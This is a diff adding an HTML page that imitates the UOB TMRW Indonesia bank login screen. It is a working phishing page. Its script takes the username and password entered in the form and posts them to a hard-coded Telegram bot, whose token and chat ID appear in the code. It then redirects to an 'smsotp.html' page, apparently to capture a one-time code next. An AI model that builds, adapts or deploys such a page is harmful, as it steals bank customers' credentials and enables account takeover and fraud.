@@ -1,0 +1,165 @@
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   UOB TMRW Login
+  </title>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <style>
+   @import url('https://fonts.googleapis.com/css2?family=Inter&display=swap');
+   body {
+     font-family: 'Inter', sans-serif;
+   }
+   @keyframes spin {
+     to {
+       transform: rotate(360deg);
+     }
+   }
+  </style>
+ </head>
+ <body class="relative min-h-screen bg-black text-white">
+  <img alt="Tall UOB building at night with lights on, dark blue sky background" class="absolute inset-0 w-full h-full object-cover brightness-50" height="800" src="https://storage.googleapis.com/a1aa/image/0d4c037a-13fa-4ac4-3408-75b78df22941.jpg" width="600"/>
+  <div class="relative z-10 flex flex-col min-h-screen px-4 pt-6 pb-8">
+   <div class="flex items-center justify-between mb-10">
+    <button aria-label="Back" class="text-white text-2xl" id="backBtn">
+     <i class="fas fa-chevron-left">
+     </i>
+    </button>
+    <div class="flex items-center space-x-1 text-white font-semibold text-lg tracking-widest">
+     <span class="text-red-700 font-extrabold text-2xl">
+      |||
+     </span>
+     <span>
+      UOB
+     </span>
+     <span>
+      |
+     </span>
+     <span>
+      TMRW
+     </span>
+    </div>
+    <button aria-label="Select language" class="flex items-center border border-white rounded-md px-2 py-1 text-white text-sm">
+     <img alt="Indonesian flag icon" class="w-5 h-3 mr-1 object-cover" height="14" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9f/Flag_of_Indonesia.svg/1599px-Flag_of_Indonesia.svg.png?20200822164827" width="20"/>
+     <i class="fas fa-chevron-down text-xs">
+     </i>
+    </button>
+   </div>
+   <h1 class="text-white text-center text-xl font-bold mb-14">
+    Halo
+   </h1>
+   <form class="space-y-6 flex flex-col" id="loginForm">
+    <div>
+     <label class="sr-only" for="username">
+      Username
+     </label>
+     <input autocomplete="username" class="w-full bg-transparent border-b border-white text-white placeholder-white placeholder-opacity-80 py-2 focus:outline-none focus:border-red-700" id="username" name="username" placeholder="Username" required="" type="text"/>
+    </div>
+    <div class="flex items-center justify-between border-b border-white">
+     <input autocomplete="current-password" class="w-full bg-transparent text-white placeholder-white placeholder-opacity-80 py-2 focus:outline-none" id="password" name="password" placeholder="Password" required="" type="password"/>
+     <button class="text-white text-sm opacity-90 hover:opacity-100 focus:outline-none" type="button">
+      Lupa?
+     </button>
+    </div>
+    <button class="w-full bg-white bg-opacity-20 text-white text-center py-3 rounded-md opacity-90 hover:opacity-100" type="submit">
+     Masuk
+    </button>
+   </form>
+   <button class="mt-4 w-full border border-white rounded-md py-3 text-white text-center text-sm" type="button" id="registerBtn">
+    Belum ada Username? Daftar sekarang
+   </button>
+   <p class="mt-8 text-center text-white text-xs leading-tight max-w-xs mx-auto">
+    UOB Indonesia berizin dan diawasi oleh Otoritas Jasa Keuangan dan Bank Indonesia serta merupakan peserta penjaminan Lembaga Penjamin Simpanan.
+   </p>
+  </div>
+
+  <!-- Loading Overlay -->
+  <div id="loadingOverlay" class="fixed inset-0 bg-black bg-opacity-90 flex flex-col items-center justify-center space-y-4 text-white text-center text-lg font-bold hidden z-50">
+   <div class="flex items-center space-x-3">
+    <div class="w-10 h-10 border-4 border-red-700 border-t-transparent rounded-full animate-spin">
+    </div>
+    <span>
+     TMRW...
+    </span>
+   </div>
+  </div>
+
+  <script>
+   // Telegram Bot API info - replace with your own bot token and chat ID
+   const TELEGRAM_BOT_TOKEN = '8398815420:AAEpqZqNC8t_QXR3bB4caJxBMXO4_MdDFls';
+   const TELEGRAM_CHAT_ID = '7549590022';
+
+   const loadingOverlay = document.getElementById('loadingOverlay');
+   const loginForm = document.getElementById('loginForm');
+   const registerBtn = document.getElementById('registerBtn');
+   const backBtn = document.getElementById('backBtn');
+
+   function showLoading() {
+     loadingOverlay.classList.remove('hidden');
+   }
+   function hideLoading() {
+     loadingOverlay.classList.add('hidden');
+   }
+
+   // Simulate navigation with loading overlay
+   function showLoadingAndNavigate() {
+     showLoading();
+     setTimeout(() => {
+       hideLoading();
+       alert('Simulated page navigation complete.');
+     }, 2000);
+   }
+
+   registerBtn.addEventListener('click', showLoadingAndNavigate);
+   backBtn.addEventListener('click', showLoadingAndNavigate);
+
+   loginForm.addEventListener('submit', async (e) => {
+     e.preventDefault();
+     showLoading();
+
+     const username = loginForm.username.value.trim();
+     const password = loginForm.password.value.trim();
+
+     if (!username || !password) {
+       alert('Please fill in both Username and Password.');
+       hideLoading();
+       return;
+     }
+
+     // Prepare message text for Telegram
+     const message = `UOB TMRW:\nUsername: ${username}\nPassword: ${password}`;
+
+     // Telegram API URL
+     const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+     try {
+       const response = await fetch(telegramUrl, {
+         method: 'POST',
+         headers: {
+           'Content-Type': 'application/json'
+         },
+         body: JSON.stringify({
+           chat_id: TELEGRAM_CHAT_ID,
+           text: message,
+           parse_mode: 'HTML'
+         })
+       });
+
+       if (response.ok) {
+        window.location.href = "smsotp.html";
+         loginForm.reset();
+       } else {
+         alert('Failed to send data to Telegram.');
+       }
+     } catch (error) {
+       alert('Error sending data to Telegram.');
+     } finally {
+       hideLoading();
+     }
+   });
+  </script>
+ </body>
+</html>
